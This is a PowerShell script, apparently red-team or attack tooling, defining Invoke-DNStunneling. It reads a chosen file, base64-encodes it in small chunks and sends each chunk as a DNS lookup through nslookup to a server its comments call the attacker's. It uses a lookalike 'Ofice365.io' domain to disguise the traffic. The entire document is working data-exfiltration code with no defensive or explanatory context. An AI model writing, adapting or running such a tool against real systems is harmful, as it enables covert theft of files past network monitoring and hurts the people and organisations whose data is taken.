function Invoke-DNStunneling {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$ServerAddress  # Attacker's server IP address
    )

    $ChunkSize = 18  # Hardcoded chunk size

    # Function to split the file content into chunks of equal size
    function Split-FileIntoChunks {
        param (
            [byte[]]$Content,
            [int]$ChunkSize
        )

        $chunks = @()
        $totalChunks = [math]::Ceiling($Content.Length / $ChunkSize)

        for ($i = 0; $i -lt $totalChunks; $i++) {
            $startIndex = $i * $ChunkSize
            $chunk = $Content[$startIndex..([math]::Min($startIndex + $ChunkSize - 1, $Content.Length - 1))]
            $chunks += [PSCustomObject]@{
                Index = $i
                Data = [System.Convert]::ToBase64String($chunk)
            }
        }

        return $chunks
    }

    # Read the file content
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)

    # Split the content into chunks
    $chunks = Split-FileIntoChunks -Content $fileContent -ChunkSize $ChunkSize

    # Send each chunk as a DNS query and log the results
    foreach ($chunk in $chunks) {
        $query = "$($chunk.Index).$($chunk.Data).Ofice365.io"  # Modify as needed to create a valid DNS name format
        try {
            # Using nslookup to send DNS query and redirecting error stream to null
            $nslookupResult = nslookup -type=A $query $ServerAddress 2>$null
            if ($nslookupResult -match "Non-existent domain|NXDOMAIN") {
                $status = "Failed To Send"
                $foregroundColor = "Red"
            } else {
                $status = "Successfully Sent"
                $foregroundColor = "Green"
            }
            $outputObj = [PSCustomObject]@{
                "Chunk Status" = "[*] $status"
                "Query" = "[*] $query"
            }
            Write-Host ("Chunk Status: " + $outputObj."Chunk Status") -ForegroundColor $foregroundColor -BackgroundColor Black
            Write-Host ("Query: " + $outputObj.Query) -ForegroundColor $foregroundColor -BackgroundColor Black
        } catch {
            $status = "Failed To Send"
            $foregroundColor = "Red"
            $outputObj = [PSCustomObject]@{
                "Chunk Status" = "[*] $status"
                "Query" = "[*] $query"
            }
            Write-Host ("Chunk Status: " + $outputObj."Chunk Status") -ForegroundColor $foregroundColor -BackgroundColor Black
            Write-Host ("Query: " + $outputObj.Query) -ForegroundColor $foregroundColor -BackgroundColor Black
        }
    }
}

# Example usage
# Invoke-DNStunneling -FilePath "C:\path\to\your\file.zip" -ServerAddress "172.21.55.115"
